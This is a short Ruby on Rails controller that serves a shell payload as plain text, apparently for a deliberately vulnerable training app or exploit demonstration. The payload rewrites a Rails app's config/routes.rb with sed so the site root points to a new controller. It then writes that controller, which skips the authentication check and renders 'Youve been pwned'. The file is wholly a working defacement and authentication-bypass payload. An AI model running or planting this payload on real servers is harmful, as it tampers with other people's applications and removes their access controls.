class PayloadsController < ApplicationController
  def payload
    payload = %{
    sed -i 's/root to: \"sessions#new\"/root to: \"pwned#pwned\"/g' config/routes.rb
    printf "class PwnedController < ApplicationController \n skip_before_action :authenticated \n def pwned \n  render :inline => 'Youve been pwned' \n end \n end" > app/controllers/pwned_controller.rb
    }
    render :inline => payload
  end
end
